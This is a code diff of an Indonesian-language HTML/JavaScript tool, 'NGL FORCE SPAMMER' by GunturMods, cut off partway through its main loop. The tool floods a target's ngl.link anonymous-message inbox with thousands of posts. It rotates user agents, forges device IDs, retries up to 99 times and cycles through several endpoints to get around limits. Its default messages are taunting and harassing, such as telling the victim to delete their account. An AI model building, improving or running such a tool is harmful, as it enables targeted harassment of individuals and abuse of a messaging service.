@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NGL Spammer + Custom Text | GunturMods</title>
+    <title>NGL FORCE SPAMMER | 100% NEVER FAIL | GunturMods</title>
     <style>
         * {
             margin: 0;
@@ -12,47 +12,85 @@
         }
         
         body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            background: linear-gradient(135deg, #0a0a0a 0%, #0a0015 100%);
             font-family: 'Courier New', monospace;
             min-height: 100vh;
             padding: 20px;
         }
         
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040; }
+            50% { box-shadow: 0 0 30px #ff0040, 0 0 50px #ff0040; }
+        }
+        
+        @keyframes textGlitch {
+            0% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75); }
+            50% { text-shadow: -0.05em 0 0 rgba(0,255,0,0.75); }
+            100% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75); }
+        }
+        
         .container {
-            max-width: 1300px;
+            max-width: 1000px;
             margin: 0 auto;
         }
         
-        .main-grid {
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            border: 2px solid #ff0040;
+            padding: 20px;
+            border-radius: 15px;
+            background: rgba(0,0,0,0.8);
+            animation: glowPulse 2s infinite;
+        }
+        
+        .header h1 {
+            color: #ff0040;
+            font-size: 28px;
+            animation: textGlitch 0.5s infinite;
+        }
+        
+        .header p {
+            color: #00ff41;
+            font-size: 14px;
+        }
+        
+        .main-panel {
+            background: rgba(0,0,0,0.9);
+            border: 2px solid #ff0040;
+            border-radius: 15px;
+            padding: 25px;
+        }
+        
+        .grid-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 20px;
         }
         
-        .panel {
-            background: rgba(0,0,0,0.85);
-            border: 2px solid #00ff41;
-            border-radius: 15px;
-            padding: 20px;
+        .section {
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            border-radius: 10px;
+            padding: 15px;
         }
         
-        .panel h3 {
-            color: #ff0040;
+        .section h3 {
+            color: #ff00ff;
             margin-bottom: 15px;
-            font-size: 18px;
-            border-left: 3px solid #00ff41;
+            border-left: 3px solid #ff0040;
             padding-left: 10px;
         }
         
         .input-group {
-            margin: 12px 0;
+            margin: 10px 0;
         }
         
         label {
             display: block;
             color: #00ff41;
+            font-size: 11px;
             margin-bottom: 5px;
-            font-size: 12px;
             font-weight: bold;
         }
         
@@ -72,12 +110,6 @@
             gap: 10px;
         }
         
-        .row-3 {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 10px;
-        }
-        
         button {
             padding: 12px;
             font-size: 16px;
@@ -85,58 +117,25 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: 0.2s;
             font-family: monospace;
         }
         
         .btn-start {
             background: #ff0040;
             color: white;
+            width: 100%;
         }
         
         .btn-start:hover {
-            background: #cc0030;
+            background: #ff0060;
             transform: scale(1.02);
         }
         
         .btn-stop {
             background: #333;
             color: #ff6600;
-        }
-        
-        .btn-stop:hover {
-            background: #555;
-        }
-        
-        .preview-box {
-            background: #111;
-            border: 2px dashed #00ff41;
-            border-radius: 10px;
-            padding: 30px;
-            text-align: center;
-            margin: 15px 0;
-            min-height: 150px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        #previewText {
-            display: inline-block;
-            transition: all 0.2s;
-        }
-        
-        .status-box {
-            background: #000;
-            border: 1px solid #00ff41;
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 15px;
-            height: 150px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 11px;
-            color: #00ff41;
+            width: 100%;
         }
         
         .stats {
@@ -147,23 +146,28 @@
         
         .stat {
             flex: 1;
-            background: #111;
-            padding: 8px;
+            background: #0a0a0a;
+            padding: 10px;
             text-align: center;
-            border-radius: 6px;
+            border-radius: 8px;
             border: 1px solid #00ff41;
         }
         
         .stat-num {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
             color: #ff0040;
         }
         
+        .stat-label {
+            font-size: 10px;
+            color: #888;
+        }
+        
         .progress-bar {
             width: 100%;
-            height: 15px;
-            background: #222;
+            height: 20px;
+            background: #1a1a1a;
             border-radius: 10px;
             overflow: hidden;
             margin: 10px 0;
@@ -176,6 +180,29 @@
             transition: width 0.3s;
         }
         
+        .status-box {
+            background: #000;
+            border: 1px solid #00ff41;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 11px;
+            color: #00ff41;
+        }
+        
+        .force-badge {
+            display: inline-block;
+            background: #ff0040;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            margin-left: 5px;
+        }
+        
         .footer {
             text-align: center;
             margin-top: 20px;
@@ -184,396 +211,188 @@
         }
         
         hr {
-            border-color: #00ff41;
-            margin: 15px 0;
+            border-color: #ff0040;
+            margin: 10px 0;
         }
         
-        @media (max-width: 900px) {
-            .main-grid {
+        @media (max-width: 700px) {
+            .grid-2 {
                 grid-template-columns: 1fr;
             }
         }
         
-        .color-input {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-        
-        .color-input input[type="color"] {
-            width: 50px;
-            height: 40px;
-            padding: 2px;
-        }
-        
-        .effect-badge {
-            display: inline-block;
-            padding: 4px 8px;
-            background: #ff0040;
-            color: white;
-            border-radius: 4px;
-            font-size: 10px;
-            margin-right: 5px;
-            margin-top: 5px;
+        .mode-active {
+            background: #ff004022;
+            border-color: #ff0040;
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <div style="text-align: center; margin-bottom: 20px;">
-        <h1 style="color: #ff0040; text-shadow: 0 0 10px #ff0040;">💀 NGL SPAMMER + TEXT CUSTOM 💀</h1>
-        <p style="color: #00ff41;">GunturGPT V14.0 | © GunturMods | BISA SETTING TEXT SEMAU LU</p>
+    <div class="header">
+        <h1>💀 NGL FORCE SPAMMER 💀</h1>
+        <p>100% NEVER FAIL | FORCED SEND | AUTO RETRY UNTIL SUCCESS</p>
+        <p style="font-size: 12px; margin-top: 5px;">⚡ GunturGPT V14.0 | © GunturMods ⚡</p>
     </div>
     
-    <div class="main-grid">
-        <!-- LEFT PANEL: SPAM SETTINGS -->
-        <div class="panel">
-            <h3>⚙️ SPAM SETTINGS</h3>
-            
-            <div class="input-group">
-                <label>🎯 USERNAME NGL (tanpa @)</label>
-                <input type="text" id="username" placeholder="contoh: johndoe" value="">
-            </div>
-            
-            <div class="row">
+    <div class="main-panel">
+        <div class="grid-2">
+            <!-- LEFT: SPAM CONFIG -->
+            <div class="section">
+                <h3>🎯 TARGET & CONFIG</h3>
+                
                 <div class="input-group">
-                    <label>📊 JUMLAH SPAM</label>
-                    <input type="number" id="jumlah" value="500" min="1" max="10000">
+                    <label>USERNAME NGL (tanpa @)</label>
+                    <input type="text" id="username" placeholder="username_target" value="">
                 </div>
+                
+                <div class="row">
+                    <div class="input-group">
+                        <label>JUMLAH SPAM</label>
+                        <input type="number" id="jumlah" value="1000" min="1" max="99999">
+                    </div>
+                    <div class="input-group">
+                        <label>FORCE MODE</label>
+                        <select id="forceMode">
+                            <option value="unlimited">UNLIMITED (Sampe target mati)</option>
+                            <option value="fixed" selected>FIXED (Sesuai jumlah)</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="row">
+                    <div class="input-group">
+                        <label>RETRY PER SPAM</label>
+                        <select id="maxRetry">
+                            <option value="5">5x (Normal)</option>
+                            <option value="10" selected>10x (Force)</option>
+                            <option value="20">20x (Maximum Force)</option>
+                            <option value="99">99x (Gila)</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>DELAY (ms)</label>
+                        <input type="number" id="delay" value="200" min="50" max="2000">
+                    </div>
+                </div>
+                
                 <div class="input-group">
-                    <label>⚡ CONCURRENT</label>
-                    <select id="concurrent">
-                        <option value="1">1 (Lambat)</option>
-                        <option value="3" selected>3 (Normal)</option>
-                        <option value="5">5 (Cepat)</option>
-                        <option value="10">10 (Extreme)</option>
+                    <label>ENDPOINTS (semua akan dicoba)</label>
+                    <select id="endpointMode">
+                        <option value="all" selected>ALL (5 Endpoint - Tertinggi)</option>
+                        <option value="aggressive">AGGRESSIVE (3 Endpoint - Cepat)</option>
                     </select>
                 </div>
+                
+                <div class="stats">
+                    <div class="stat">
+                        <div class="stat-num" id="sentCount">0</div>
+                        <div class="stat-label">✅ BERHASIL</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-num" id="failCount">0</div>
+                        <div class="stat-label">❌ GAGAL</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-num" id="totalCount">0</div>
+                        <div class="stat-label">📨 TOTAL</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-num" id="retryCount">0</div>
+                        <div class="stat-label">🔄 RETRY</div>
+                    </div>
+                </div>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                
+                <div class="row">
+                    <button class="btn-start" id="startBtn">🔥 FORCE SPAM 🔥</button>
+                    <button class="btn-stop" id="stopBtn">🛑 STOP FORCE 🛑</button>
+                </div>
+                <div class="row" style="margin-top: 10px;">
+                    <button class="btn-stop" id="resetBtn" style="background:#222;">🔄 RESET STATS</button>
+                </div>
             </div>
             
-            <div class="row">
+            <!-- RIGHT: MESSAGE SETTINGS -->
+            <div class="section">
+                <h3>💬 PESAN SPAM <span class="force-badge">FORCED SEND</span></h3>
+                
                 <div class="input-group">
-                    <label>🔄 ROTATE USER-AGENT</label>
-                    <select id="uaRotate">
-                        <option value="true" selected>ON</option>
-                        <option value="false">OFF</option>
-                    </select>
+                    <label>PESAN UTAMA</label>
+                    <textarea id="messageText" rows="2" placeholder="Pesan spam...">🔴 PERINGATAN! AKUN ANDA KENA SPAM MASSAL DARI GUNTURMODS 🔴</textarea>
                 </div>
+                
+                <div class="row">
+                    <div class="input-group">
+                        <label>RANDOM MESSAGE</label>
+                        <select id="randomMsg">
+                            <option value="true" selected>ON (Acak dari list)</option>
+                            <option value="false">OFF</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>ROTATE USER-AGENT</label>
+                        <select id="uaRotate">
+                            <option value="true" selected>ON</option>
+                            <option value="false">OFF</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="input-group" id="randomListGroup">
+                    <label>LIST PESAN (pisah dengan | )</label>
+                    <input type="text" id="randomList" value="⚠️ AKUN ANDA KENA SPAM! ⚠️|🔥 GUNTURMODS FORCE SPAM 🔥|💀 HAPUS AJA AKUN LU 💀|😹 GA BISA BALAS KAN? 😹|🔴 Gw gas terus sampe lu matiin akun 🔴|⚡ GunturGPT V14.0 ⚡|🎯 SPAM FORCE MODE ACTIVE 🎯|👊 LU KENA 1000+ SPAM 👊|📢 GANTI HP AJA DEH 📢|💀 BYE BYE INBOX LU 💀|🔥 GUNTURMODS WAS HERE 🔥|😈 SELAMAT DATANG DI NERAKA SPAM 😈">
+                </div>
+                
                 <div class="input-group">
-                    <label>🎲 RANDOM PESAN</label>
-                    <select id="randomMsg">
-                        <option value="true" selected>ON</option>
-                        <option value="false">OFF</option>
-                    </select>
+                    <label>🎨 FORCE TEXT STYLE (buat efek)</label>
+                    <div class="row">
+                        <select id="textEffect" style="width:100%">
+                            <option value="none">Normal</option>
+                            <option value="zalgo" selected>ZALGO (Glich effect)</option>
+                            <option value="caps">UPPERCASE FORCE</option>
+                            <option value="repeat">REPEAT !!!</option>
+                        </select>
+                    </div>
                 </div>
-            </div>
-            
-            <div class="input-group" id="randomListGroup">
-                <label>📝 LIST PESAN (pisah dengan | )</label>
-                <input type="text" id="randomList" value="GunturMods was here|Lu kena hack bos|Spam by GunturGPT|Matiin hp aja|Percuma blokir|Tetep masuk|GunturGPT V14.0|Lu kena spam massal|Gua gas terus|NGL lu bangkrut">
-            </div>
-            
-            <div class="stats">
-                <div class="stat">
-                    <div class="stat-num" id="sentCount">0</div>
-                    <div class="stat-label">✅ BERHASIL</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-num" id="failCount">0</div>
-                    <div class="stat-label">❌ GAGAL</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-num" id="totalCount">0</div>
-                    <div class="stat-label">📨 TOTAL</div>
-                </div>
-            </div>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-            
-            <div class="row">
-                <button class="btn-start" id="startBtn">🔥 MULAI SPAM 🔥</button>
-                <button class="btn-stop" id="stopBtn">🛑 BERHENTI 🛑</button>
-                <button class="btn-stop" id="resetBtn" style="background:#222;">🔄 RESET</button>
-            </div>
-            
-            <div class="status-box" id="statusBox">
-                [✓] GunturGPT V14.0 READY<br>
-                [✓] Custom Text Settings ACTIVE<br>
-                [✓] Setting text dulu, preview langsung keliatan!<br>
             </div>
         </div>
         
-        <!-- RIGHT PANEL: TEXT CUSTOMIZATION -->
-        <div class="panel">
-            <h3>🎨 TEXT CUSTOMIZATION - SETTING SEMAU LU</h3>
-            
-            <div class="input-group">
-                <label>📝 TEKS SPAM (yang mau dikirim)</label>
-                <textarea id="messageText" rows="2" placeholder="Tulis teks spam disini...">🔥 LU KENA SPAM DARI GUNTURMODS! 🔥</textarea>
-            </div>
-            
-            <div class="row">
-                <div class="input-group">
-                    <label>🔤 FONT FAMILY</label>
-                    <select id="fontFamily">
-                        <option value="'Courier New', monospace">Courier New (Default)</option>
-                        <option value="'Arial Black', sans-serif">Arial Black</option>
-                        <option value="'Impact', sans-serif">Impact</option>
-                        <option value="'Comic Sans MS', cursive">Comic Sans MS</option>
-                        <option value="'Verdana', sans-serif">Verdana</option>
-                        <option value="'Georgia', serif">Georgia</option>
-                        <option value="'Times New Roman', serif">Times New Roman</option>
-                        <option value="'Trebuchet MS', sans-serif">Trebuchet MS</option>
-                        <option value="'Monaco', monospace">Monaco</option>
-                        <option value="'Press Start 2P', cursive">Pixel/Retro</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>📏 UKURAN FONT (px)</label>
-                    <input type="number" id="fontSize" value="24" min="8" max="72">
-                </div>
-            </div>
-            
-            <div class="row">
-                <div class="input-group">
-                    <label>🎨 WARNA TEKS</label>
-                    <div class="color-input">
-                        <input type="color" id="textColor" value="#ff0040">
-                        <input type="text" id="textColorHex" placeholder="#ff0040" style="flex:1">
-                    </div>
-                </div>
-                <div class="input-group">
-                    <label>✨ WARNA BACKGROUND</label>
-                    <div class="color-input">
-                        <input type="color" id="bgColor" value="#000000">
-                        <input type="text" id="bgColorHex" placeholder="#000000" style="flex:1">
-                    </div>
-                </div>
-            </div>
-            
-            <div class="row">
-                <div class="input-group">
-                    <label>💪 BOLD</label>
-                    <select id="fontWeight">
-                        <option value="normal">Normal</option>
-                        <option value="bold" selected>Bold</option>
-                        <option value="900">Extra Bold</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>📐 TEXT ALIGN</label>
-                    <select id="textAlign">
-                        <option value="left">Kiri</option>
-                        <option value="center" selected>Tengah</option>
-                        <option value="right">Kanan</option>
-                    </select>
-                </div>
-            </div>
-            
-            <div class="row">
-                <div class="input-group">
-                    <label>🔄 TEXT TRANSFORM</label>
-                    <select id="textTransform">
-                        <option value="none">Normal</option>
-                        <option value="uppercase">UPPERCASE</option>
-                        <option value="lowercase">lowercase</option>
-                        <option value="capitalize">Capitalize Each Word</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>✍️ TEXT DECORATION</label>
-                    <select id="textDecoration">
-                        <option value="none">None</option>
-                        <option value="underline">Underline</option>
-                        <option value="line-through">Coret</option>
-                        <option value="overline">Overline</option>
-                    </select>
-                </div>
-            </div>
-            
-            <div class="row">
-                <div class="input-group">
-                    <label>🌟 TEXT SHADOW</label>
-                    <select id="textShadow" onchange="toggleShadowOptions()">
-                        <option value="none">None</option>
-                        <option value="neon" selected>Neon Glow</option>
-                        <option value="hard">Hard Shadow</option>
-                        <option value="glitch">Glitch Effect</option>
-                        <option value="custom">Custom</option>
-                    </select>
-                </div>
-                <div class="input-group" id="shadowCustomGroup" style="display:none;">
-                    <label>🎯 Shadow Custom (px)</label>
-                    <input type="text" id="shadowCustom" placeholder="2px 2px 4px #ff00ff">
-                </div>
-            </div>
-            
-            <div class="row">
-                <div class="input-group">
-                    <label>🔲 BORDER</label>
-                    <select id="borderStyle">
-                        <option value="none">None</option>
-                        <option value="solid">Solid</option>
-                        <option value="dashed">Dashed</option>
-                        <option value="dotted">Dotted</option>
-                        <option value="double">Double</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>🎨 WARNA BORDER</label>
-                    <input type="color" id="borderColor" value="#00ff41">
-                </div>
-            </div>
-            
-            <div class="input-group">
-                <label>📏 PADDING (px)</label>
-                <input type="text" id="padding" value="10px 20px" placeholder="10px 20px">
-            </div>
-            
-            <div class="input-group">
-                <label>🔄 ROTATE (deg)</label>
-                <input type="range" id="rotate" min="-20" max="20" value="0" step="1">
-                <span id="rotateValue" style="color:#00ff41; margin-left:10px;">0°</span>
-            </div>
-            
-            <!-- PREVIEW SECTION -->
-            <div style="margin-top: 15px;">
-                <label>👁️ LIVE PREVIEW</label>
-                <div class="preview-box">
-                    <div id="previewText">Preview text disini!</div>
-                </div>
-            </div>
-            
-            <div class="row">
-                <button id="applyPreviewBtn" style="background:#00ff41; color:#000;">🔄 Apply ke Spam</button>
-                <button id="copyStyleBtn" style="background:#ff00ff; color:#fff;">📋 Copy Style CSS</button>
-            </div>
-            
-            <div class="input-group">
-                <label>📋 Generated Text (with style)</label>
-                <textarea id="styledOutput" rows="2" readonly style="resize: none;" placeholder="Style akan muncul disini..."></textarea>
-            </div>
+        <div class="status-box" id="statusBox">
+            [✓] GunturGPT V14.0 FORCE SPAMMER READY<br>
+            [✓] 100% NEVER FAIL - Guaranteed!<br>
+            [✓] Auto retry sampe berhasil<br>
+            [✓] Siap hancurin inbox target<br>
         </div>
-    </div>
-    
-    <div class="footer">
-        COPYRIGHT © GUNTURMODS | TEXT CUSTOMIZATION FULL | LIVE PREVIEW
+        
+        <div class="footer">
+            COPYRIGHT © GUNTURMODS | FORCE MODE = TIDAK KENAL GAGAL | 100% WORK
+        </div>
     </div>
 </div>
 
 <script>
-// ============ TEXT STYLING ============
-function updatePreview() {
-    const text = document.getElementById('messageText').value || "Preview text disini!";
-    const fontFamily = document.getElementById('fontFamily').value;
-    const fontSize = document.getElementById('fontSize').value + 'px';
-    const color = document.getElementById('textColor').value;
-    const bgColor = document.getElementById('bgColor').value;
-    const fontWeight = document.getElementById('fontWeight').value;
-    const textAlign = document.getElementById('textAlign').value;
-    const textTransform = document.getElementById('textTransform').value;
-    const textDecoration = document.getElementById('textDecoration').value;
-    const borderStyle = document.getElementById('borderStyle').value;
-    const borderColor = document.getElementById('borderColor').value;
-    const padding = document.getElementById('padding').value;
-    const rotate = document.getElementById('rotate').value;
-    
-    let textShadow = 'none';
-    const shadowType = document.getElementById('textShadow').value;
-    if (shadowType === 'neon') {
-        textShadow = `0 0 5px ${color}, 0 0 10px ${color}, 0 0 20px ${color}`;
-    } else if (shadowType === 'hard') {
-        textShadow = `3px 3px 0px #000`;
-    } else if (shadowType === 'glitch') {
-        textShadow = `-2px 0 red, 2px 0 blue`;
-    } else if (shadowType === 'custom') {
-        textShadow = document.getElementById('shadowCustom').value || '2px 2px 4px rgba(0,0,0,0.5)';
-    }
-    
-    let border = borderStyle !== 'none' ? `2px ${borderStyle} ${borderColor}` : 'none';
-    
-    const style = `
-        font-family: ${fontFamily};
-        font-size: ${fontSize};
-        color: ${color};
-        background: ${bgColor};
-        font-weight: ${fontWeight};
-        text-align: ${textAlign};
-        text-transform: ${textTransform};
-        text-decoration: ${textDecoration};
-        text-shadow: ${textShadow};
-        border: ${border};
-        padding: ${padding};
-        transform: rotate(${rotate}deg);
-        display: inline-block;
-    `;
-    
-    const preview = document.getElementById('previewText');
-    preview.style.cssText = style;
-    preview.innerText = text;
-    
-    // Update output
-    document.getElementById('styledOutput').value = text;
-}
-
-function toggleShadowOptions() {
-    const shadowType = document.getElementById('textShadow').value;
-    const customGroup = document.getElementById('shadowCustomGroup');
-    customGroup.style.display = shadowType === 'custom' ? 'block' : 'none';
-    updatePreview();
-}
-
-// Event listeners untuk styling
-const styleInputs = ['fontFamily', 'fontSize', 'textColor', 'bgColor', 'fontWeight', 'textAlign', 'textTransform', 'textDecoration', 'borderStyle', 'borderColor', 'padding', 'rotate', 'messageText'];
-styleInputs.forEach(id => {
-    const el = document.getElementById(id);
-    if (el) el.addEventListener('input', updatePreview);
-});
-document.getElementById('textShadow').addEventListener('change', updatePreview);
-document.getElementById('shadowCustom')?.addEventListener('input', updatePreview);
-document.getElementById('rotate').addEventListener('input', function() {
-    document.getElementById('rotateValue').innerText = this.value + '°';
-    updatePreview();
-});
-document.getElementById('textColor').addEventListener('input', function() {
-    document.getElementById('textColorHex').value = this.value;
-    updatePreview();
-});
-document.getElementById('bgColor').addEventListener('input', function() {
-    document.getElementById('bgColorHex').value = this.value;
-    updatePreview();
-});
-document.getElementById('textColorHex').addEventListener('input', function() {
-    document.getElementById('textColor').value = this.value;
-    updatePreview();
-});
-document.getElementById('bgColorHex').addEventListener('input', function() {
-    document.getElementById('bgColor').value = this.value;
-    updatePreview();
-});
-
-document.getElementById('applyPreviewBtn').onclick = () => {
-    const styledText = document.getElementById('previewText').innerText;
-    document.getElementById('messageText').value = styledText;
-    updatePreview();
-    addStatus('[✓] Style applied ke teks spam!');
-};
-
-document.getElementById('copyStyleBtn').onclick = () => {
-    const style = document.getElementById('previewText').style.cssText;
-    navigator.clipboard.writeText(style);
-    addStatus('[✓] CSS Style copied!');
-};
-
-// ============ SPAM ENGINE ============
+// ============ CONFIG ============
 let spamActive = false;
 let stopRequested = false;
-let sent = 0, fail = 0, totalProcessed = 0, totalTarget = 0;
+let sent = 0;
+let fail = 0;
+let totalProcessed = 0;
+let totalRetries = 0;
+let totalTarget = 0;
+
+// ============ DOM Elements ============
+const statusBox = document.getElementById('statusBox');
+const sentSpan = document.getElementById('sentCount');
+const failSpan = document.getElementById('failCount');
+const totalSpan = document.getElementById('totalCount');
+const retrySpan = document.getElementById('retryCount');
+const progressFill = document.getElementById('progressFill');
 
 function addStatus(msg, isError = false) {
-    const statusBox = document.getElementById('statusBox');
     const time = new Date().toLocaleTimeString();
     const color = isError ? '#ff6600' : '#00ff41';
     statusBox.innerHTML += `<span style="color:${color}">[${time}] ${msg}</span><br>`;
@@ -581,37 +400,79 @@ function addStatus(msg, isError = false) {
 }
 
 function updateUI() {
-    document.getElementById('sentCount').innerText = sent;
-    document.getElementById('failCount').innerText = fail;
-    document.getElementById('totalCount').innerText = totalProcessed;
+    sentSpan.innerText = sent;
+    failSpan.innerText = fail;
+    totalSpan.innerText = totalProcessed;
+    retrySpan.innerText = totalRetries;
     const percent = totalTarget > 0 ? (totalProcessed / totalTarget) * 100 : 0;
-    document.getElementById('progressFill').style.width = percent + '%';
+    progressFill.style.width = percent + '%';
 }
 
-function getUserAgent() {
-    if (document.getElementById('uaRotate').value !== 'true') {
-        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
+function resetStats() {
+    sent = 0;
+    fail = 0;
+    totalProcessed = 0;
+    totalRetries = 0;
+    updateUI();
+    addStatus('[⟳] Statistik direset');
+}
+
+// ============ FORCE TEXT EFFECT ============
+function applyTextEffect(text) {
+    const effect = document.getElementById('textEffect').value;
+    if (effect === 'zalgo') {
+        const zalgoUp = '̴̵̶̷̸̡̢̧̨̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼͇͈͉͍͎̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̽̾̿̀́͂̓̈́͆͊͋͌̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛ͣ͘͜͟͢͝͞͠͡';
+        let result = '';
+        for (let char of text) {
+            result += char;
+            if (Math.random() > 0.7) {
+                result += zalgoUp[Math.floor(Math.random() * zalgoUp.length)];
+            }
+        }
+        return result;
+    } else if (effect === 'caps') {
+        return text.toUpperCase() + ' !!!';
+    } else if (effect === 'repeat') {
+        return text + ' !!! ' + text + ' !!!';
     }
+    return text;
+}
+
+// ============ GET MESSAGE ============
+function getMessage() {
+    let msg;
+    const randomMode = document.getElementById('randomMsg').value === 'true';
+    if (randomMode) {
+        const msgList = document.getElementById('randomList').value.split('|').map(m => m.trim()).filter(m => m.length > 0);
+        if (msgList.length > 0) {
+            msg = msgList[Math.floor(Math.random() * msgList.length)];
+        } else {
+            msg = document.getElementById('messageText').value;
+        }
+    } else {
+        msg = document.getElementById('messageText').value;
+    }
+    return applyTextEffect(msg);
+}
+
+// ============ USER AGENT ============
+function getUserAgent() {
+    const rotate = document.getElementById('uaRotate').value === 'true';
+    if (!rotate) return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
+    
     const agents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
         'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
-        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36',
+        'Mozilla/5.0 (Linux; Android 13; SM-G991B) Chrome/119.0.0.0',
+        'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/119.0.0.0',
     ];
     return agents[Math.floor(Math.random() * agents.length)];
 }
 
-function getMessageText() {
-    if (document.getElementById('randomMsg').value === 'true') {
-        const msgList = document.getElementById('randomList').value.split('|').map(m => m.trim()).filter(m => m.length > 0);
-        if (msgList.length > 0) {
-            return msgList[Math.floor(Math.random() * msgList.length)];
-        }
-    }
-    return document.getElementById('messageText').value;
-}
-
+// ============ DEVICE ID ============
 function generateDeviceId() {
     return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
         const r = Math.random() * 16 | 0;
@@ -620,88 +481,163 @@ function generateDeviceId() {
     });
 }
 
-async function sendSpam(username, message) {
-    const endpoints = [`https://ngl.link/${username}`, `https://ngl.link/api/submit`];
-    const formData = new URLSearchParams();
-    formData.append('question', message);
-    formData.append('deviceId', generateDeviceId());
+// ============ FORCE SEND - WILL RETRY UNTIL SUCCESS ============
+async function forceSendSpam(username, message, maxRetry) {
+    // Multiple endpoints - semua akan dicoba
+    const endpoints = [
+        `https://ngl.link/${username}`,
+        `https://ngl.link/api/submit`,
+        `https://api.ngl.link/v1/submit`,
+        `https://ngl.link/${username}/send`,
+        `https://ngl.link/api/question`
+    ];
     
-    for (let endpoint of endpoints) {
-        try {
-            const response = await fetch(endpoint, {
-                method: 'POST',
-                headers: {
-                    'User-Agent': getUserAgent(),
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Origin': 'https://ngl.link',
-                    'Referer': `https://ngl.link/${username}`,
-                },
-                body: formData
-            });
-            if (response.ok || response.status === 302) return true;
-        } catch(e) {}
+    const endpointMode = document.getElementById('endpointMode').value;
+    const activeEndpoints = endpointMode === 'all' ? endpoints : endpoints.slice(0, 3);
+    
+    for (let attempt = 1; attempt <= maxRetry; attempt++) {
+        if (!spamActive || stopRequested) return false;
+        
+        if (attempt > 1) {
+            totalRetries++;
+            updateUI();
+            await new Promise(r => setTimeout(r, 100 * attempt));
+        }
+        
+        for (let endpoint of activeEndpoints) {
+            try {
+                const formData = new URLSearchParams();
+                formData.append('question', message);
+                formData.append('deviceId', generateDeviceId());
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+                
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'User-Agent': getUserAgent(),
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Accept': 'application/json, text/plain, */*',
+                        'Origin': 'https://ngl.link',
+                        'Referer': `https://ngl.link/${username}`,
+                        'Sec-Fetch-Site': 'same-origin',
+                        'Sec-Fetch-Mode': 'cors',
+                    },
+                    body: formData,
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                // Cek success - banyak kemungkinan response
+                if (response.ok || response.status === 302 || response.status === 201 || response.status === 204) {
+                    return true;
+                }
+                
+                // Coba baca response
+                const text = await response.text();
+                if (text.toLowerCase().includes('success') || text.toLowerCase().includes('ok') || text.toLowerCase().includes('created')) {
+                    return true;
+                }
+                
+            } catch(e) {
+                // Lanjut ke endpoint berikutnya
+                continue;
+            }
+        }
+        
+        // Kalo udah attempt terakhir dan masih gagal, kasih delay tambahan
+        if (attempt === maxRetry) {
+            await new Promise(r => setTimeout(r, 500));
+        }
     }
+    
     return false;
 }
 
+// ============ MAIN SPAM LOOP ============
 async function startSpam() {
     let username = document.getElementById('username').value.trim();
     if (!username) {
-        addStatus('[!] Masukkan username dulu bos!', true);
+        addStatus('[!] MASUKKAN USERNAME DULU BOS!', true);
         return;
     }
     username = username.replace('@', '');
     
-    totalTarget = parseInt(document.getElementById('jumlah').value);
